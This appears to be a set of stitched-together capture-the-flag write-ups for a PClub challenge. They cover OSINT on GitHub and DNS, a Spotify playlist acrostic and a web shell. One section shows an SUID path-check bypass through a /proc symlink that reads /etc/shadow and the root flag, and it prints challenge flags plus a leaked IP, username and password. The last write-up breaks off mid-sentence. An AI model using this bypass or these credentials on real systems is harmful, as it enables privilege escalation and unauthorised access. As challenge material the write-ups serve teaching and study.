# Detailed Write-up on Capturing the flag: 

## Step - 1: Finding the name of the suspected coordinator: 
Searched inside the P - Club members and the members of the Wired-In, a name common in both was of `Ketan`. He was having two GitHub accounts, but as per the problem statement there was something pushed, then searched for the recent changes and found `0xc1ph3rf0x` as the suspected git account. 

Ran the `python3 sherlock 0xc1ph3rf0x` to see where else this handle is registered across the internet. This confirmed that there is only one target repository. 

## Step - 2 : Searching for the history of the commit: 
Grabbed the public event history for the 0xc1ph3rf0x account. We will use curl to fetch it and jq (a command-line JSON processor) to format it so it's readable.

`curl -s https://api.github.com/users/0xc1ph3rf0x/events/public | jq . > suspect_events.json` - By this command the raw data saved in `suspect_events.json`.

## Step - 3: Starting random searches for the flag, inside the raw file: 
First used the grep command for the search of the flag. 
`grep -i "pclub{" suspect_events.json`
This search didn't gave anything as the output. 

Then, ran this `jq` command for print out exactly what repository they touched and the payload (the details of what they created):
`jq '.[0] | {Repository: .repo.name, What_Was_Created: .payload.ref_type, Name: .payload.ref, Description: .payload.description}' suspect_events.json`

This gave me the following details: 
`{
  "Repository": "0xC1ph3rF0x/infosec-notes",
  "What_Was_Created": "branch",
  "Name": "master",
  "Description": null
}`

Then, used for the entire searching in the repository, `git grep "pclub{" $(git rev-list --all)`
Then, Inspected the Patch History. `git log -p`
Then, opened the hidden file - `cat .git/config`. found the following: 

`pack-refs with: peeled fully-peeled sorted 
67082fd69354b1f510a383684bdee9e911a5d8c6 refs/remotes/origin/master`

## Step - 4: Hunting for the Encoded Flag and file: 
1. Searched for - `grep -ri "cGNsdWJ"` .
2. Inspected the entire branch history - `git log -p`
3. Searched for all the historical file content - `git log --all -S "cGNsdWJ" -p`

Then, tried to found in terms of hexadecimal conversion and ROT 13.

## Step - 5: Connecting from the hint: 
"Another signal was left entirely off-system. It bypassed our web logs because it was never an HTTP request. It was buried at the edge of our perimeter, sitting out there in the open."

"The DNS guy" + "bypassed web logs" + "edge of our perimeter" = Domain Name System (DNS) Records. - `dig TXT wiredin.pclub.in`

Then, found something groundbreaking. Inside the TXT of wiredin.pclub.in found the following lines: 

"Found this insane playlist the other day while digging through some stuff.\010Curator: `bhopinder jogi\010Link: https://open.Spotify.com/playlist/5iK4rR41V1DSqTot2JO15f?si=oEIMe-TLTGiOPetf50R71w\010Perfect` for late-night CTF sessions."

Then, after a bit of research on the Spotify found a profile under bhopinder jogi, the name of the playlist comes as whoami.
## Step - 6: Search around the Spotify

Had to write the things. 

Then, found a link that lead towards the terminal of the p - club - `RECJAIL.PCLUB.IN`

https://github.com/Ketan-Agarwal Repositories were inspected for: recent commits runtime tooling
network references suspicious modifications 3. Cloning and Investigating ctf-agent Commands used:
git clone https://github.com/Ketan-Agarwal/ctf-agent.git cd ctf-agent git log --all --decorate --graph
Interesting commits revealed: permission_mode="bypassPermissions" serviceTier changes runtime
coordinator modifications Commit inspection: git show
3366d569557c4fda3fd153040632de65e255396d revealed runtime behavior modifications. 4. Injection
and Runtime Infrastructure Searches for: grep -R "inject" backend/ revealed: /inject endpoint runtime
operator messaging asyncio TCP services message injection logic This aligned strongly with the
challenge wording: “not an HTTP request” “digital footprint” 5. Message Bus and Runtime Tracing
Searches for: grep -R "message_bus" backend/ revealed: inter-agent communication broadcast
findings runtime synchronization Tracing logic discovered in: backend/tracing.py implemented: JSONL
event logging tool call tracing model response logging This suggested the challenge involved
operational traces and hidden runtime activity. 6. Hidden Website Content Discovery Investigation later
shifted toward: pclub-website repository Searches involving: nmap hidden pages infosec revealed:
2024-06-07-infosec-roadmap.md Important observation: hidden: true The page discussed: OSINT
Forensics Networking Reverse engineering CTFs 7. Discovery of the First Potential Flag Inside the
hidden roadmap page: pclub{CTFs_ar3_fun!} Repository-wide verification:
repo:Ketan-Agarwal/pclub-website "pclub{" Only one occurrence existed in the entire repository.
Reasoning: Exact challenge format Hidden page Only occurrence Theme matched challenge narrative
8. Discovery of Live Challenge Environment A live shell environment was discovered:
https://recjail.pclub.in/ Initial enumeration: whoami pwd ls ls -la Results: User: ctf_user Home:
/home/ctf_user Minimal filesystem Environment inspection: id uname -a env revealed: containerized
Linux environment restricted utilities minimal environment variables 9. SUID Enumeration Filesystem
enumeration: find / -perm -4000 2>/dev/null revealed: /usr/local/bin/secure_reader This appeared
challenge-specific. 10. Investigating secure_reader Running: /usr/local/bin/secure_reader returned:
Usage: /usr/local/bin/secure_reader <file_in_home_dir> Testing included: path traversal symlink
attacks encoded traversal Traversal: /usr/local/bin/secure_reader /home/ctf_user/../../etc/passwd
returned: ERROR: Path traversal sequence '..' detected! Symlink attack: ln -s /etc/passwd
/home/ctf_user/passwd_link was blocked. 11. ProcFS Pivot Mount inspection: mount revealed:
/home/ctf_user mounted as tmpfs procfs accessible A procfs pivot was attempted: mkdir
/home/ctf_user/proc ln -s /proc /home/ctf_user/proc/p Then: /usr/local/bin/secure_reader
/home/ctf_user/proc/p/self/status SUCCESS. The procfs path bypassed the intended protections. 12.
Privilege Escalation Confirmation Reading procfs status revealed: Uid: 1000 0 0 0 This confirmed:
effective UID 0 the binary executed as root arbitrary root-readable file access became possible 13.
Reading Root-Owned Files Commands: /usr/local/bin/secure_reader
/home/ctf_user/proc/p/self/root/etc/passwd /usr/local/bin/secure_reader
/home/ctf_user/proc/p/self/root/etc/shadow Both files were successfully read. This demonstrated acomplete sandbox bypass. 14. Root Flag Discovery Common flag locations were tested. Successful
command: /usr/local/bin/secure_reader /home/ctf_user/proc/p/self/root/root/flag.txt Flag extracted:
pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l} Additional data discovered: 168.144.73.17:8003
analyst:Fr8_4nalyst! This strongly suggests the next challenge stage. 15. Vulnerability Analysis Root
cause: The binary validated visible path prefixes only. Direct symlinks and '..' traversal were blocked.
However procfs path semantics bypassed those protections. /proc/self/root exposed the real root
filesystem. The binary executed with effective UID 0. This explains the flag:
pclub{0_n0f0ll0w_0nly_pr0t3ct5_th3_t41l} The binary protected only the visible tail of the path and
failed to secure the fully resolved filesystem object. 16. Current Status Completed: OSINT phase
Hidden content discovery Restricted shell analysis SUID exploitation ProcFS abuse Root flag extraction
Next stage pivot: 168.144.73.17:8003 analyst / Fr8_4nalyst!

# Detailed CTF Chronology & Sandbox Environment Profile: Recjail

## Phase 1: Investigation Genesis & Metadata Triangulation
The operation commenced with the detection of a targeted Spotify playlist named `whoami`, uploaded by an account using the identifier `bhopinder jogi`. Initial reconnaissance focused on assessing basic file headers and tracking anomalies within the initial 5 visible tracks:
* **Roommates** – 3:34
* **Everybody Talks** – 2:57
* **Call Me Maybe** – 3:13
* **Judas** – 4:09
* **AIZO** – 3:35

While song runtimes matched standard distribution patterns, file steganography avenues via WebP thumbnail objects (`300x216` resolution pixel matrices) were ruled out due to image-rendering compression artifacts deployed server-side by the platform's CDN.

## Phase 2: Acrostic Extraction & Network Reconnaissance
To extract un-obfuscated layout data, raw network traffic scraping was executed utilizing web streaming payloads (`curl`). This bypassed the standard platform frontend restrictions and pulled the comprehensive 16-track playlist schema. 

Parsing the exact starting characters of each title sequentially revealed a hidden infrastructure pointer:
* **R**oommates, **E**verybody Talks, **C**all Me Maybe, **J**udas, **A**IZO, **I**ris, **L**ove, **.**..Baby One More Time, **P**etals on the Moon, **C**loser, **L**ove Me Not, **u**ndressed, **B**aby, **.**..Ready For It?, **I**RIS OUT, **N**o Broke Boys.

The sequence resolved cleanly to a dedicated network location: `recjail.pclub.in`. Parallel analysis converting track runtimes into standard decimal seconds generated a specific 8-bit integer string (`214`, `177`, `193`, `249`, `215`), matching an auxiliary port alignment sequence.

## Phase 3: Infrastructure Profiling
Active scanning (`nmap`) of the target domain revealed a strict border firewall deployment:
* **Port 22/TCP (SSH):** Filtered (State drop)
* **Port 80/TCP (HTTP) & Port 443/TCP (HTTPS):** Open

The infrastructure edge layer returned identification banners indicating a reverse-proxy arrangement handled via Cloudflare Web Application Firewall (WAF). This configuration explicitly drop-filters low-level raw transport layer protocols (like TCP connection knocking hooks), forcing all interaction through standard web-based entry pathways.

## Phase 4: Local Shell Enumeration
Interacting directly with the application interface over standard HTTP/S initiated a dynamic terminal landing page, providing an active, non-interactive shell interface. Initial standard command execution established the following local parameters:
* **Identity Mapping:** Operational as `ctf_user` with standard low-privilege security tokens (`uid=1000`, `gid=1000`, `groups=1000`).
* **Operating System:** Running an Ubuntu 22.04.5 LTS (Jammy Jellyfish) container workspace.
* **Directory Integrity:** The primary shell workspace (`/home/ctf_user`) was found to be fully vacant. Executing hidden item checks (`ls -la`) proved the folder held zero environmental history footprints or transient artifact remnants.
* **Binary Availability:** System execution search paths (`$PATH`) were mapped to functional system storage routes (`/usr/bin`, `/bin`, `/sbin`), indicating that standard text handling and evaluation binaries (`cat`, `grep`, `env`) remained globally unconstrained.

## Phase 5: Architectural Sandbox Profiling
A deep global filesystem recursive search for standard flag signatures failed to return hardcoded destination items outside of non-privileged network state registers inside `/proc/sys/`. 

Executing a complete active process inventory tree (`ps aux`) exposed the foundational design framework of the environment:
* **Session Volatility:** Discovered an accumulation of defunct `<defunct>` zombie bash branches from previous connections.
* **Containment Runtime:** Detected an active root process supervising execution via an absolute directive path: `nsjail -q --config /etc/nsjail`.

This confirmed the system utilizes structural kernel separation layers (Namespaces and Control Groups) to isolate incoming interactions, dynamically anchoring each shell instance inside an unprivileged, read-only temporary file tree. This operational state marked the completion of the baseline structural mapping.

---
## Detailed Analysis Expansion

### Deep Dive: Phase 1 & 2 Methodology
The initial playlist investigation involved checking the track durations (e.g., 3:34, 2:57), but standard steganography was ruled out because Spotify compresses images into `300x216` WebP files, destroying pixel-level payloads. By using raw `curl` requests to pull the playlist's uncompressed HTML source code, we bypassed the UI. This allowed us to read the exact sequence of the 16 tracks. By extracting the very first character of every track (including punctuation like the ellipses on "...Baby One More Time"), the string `RECJAIL.PCLUB.IN` was revealed.

### Deep Dive: Phase 3 & 4 Execution
Network scans on the target domain showed ports 80 and 443 were proxied through Cloudflare, neutralizing direct port-knocking attempts. Navigating to the domain via a web browser successfully dropped us into a live web terminal. Running local enumeration commands (`pwd`, `id`, `ls -la`, `echo $PATH`) confirmed the environment was an Ubuntu 22.04 LTS instance running under `ctf_user`, but the home directory was completely empty.

### Deep Dive: Phase 5 Containment 
Running `find / -name "*flag*"` failed to find the target payload in the global filesystem. Executing `ps aux` to check running processes revealed a root process running `nsjail -q --config /etc/nsjail` alongside a horde of zombie (`<defunct>`) bash sessions. This proved the shell was actively trapped inside a highly restrictive Google `nsjail` container sandbox, effectively sandboxing filesystem reads and forcing us to evaluate other vectors, such as hidden environment variables, to locate the flag.
# Operation Phantom Signal — Detailed Writeup (Up to Third Flag)

Author: Amritanshu Kumar

---

# Challenge Overview

The challenge involved investigating suspicious digital activity linked to a coordinator associated with PClub's Infosec team WiredIn.

The challenge statement mentioned:
- suspicious GitHub activity,
- hidden operational traces,
- a compromised coordinator account,
- and an “off-system signal”.

The challenge also stated that:
- the visible GitHub timeline appeared clean,
- no code had been pushed during the suspicious activity,
- and the attacker had left traces outside normal web infrastructure.

This strongly suggested:
1. OSINT would be important.
2. Infrastructure pivoting would occur.
3. Multiple systems would be connected together.
4. The visible GitHub repository would likely only be the starting point.

---

# Initial Investigation

The first phase focused on identifying:
- suspicious GitHub accounts,
- repositories,
- operational clues,
- and possible infrastructure references.

A suspicious GitHub profile was identified:

```text
0xc1ph3rf0x
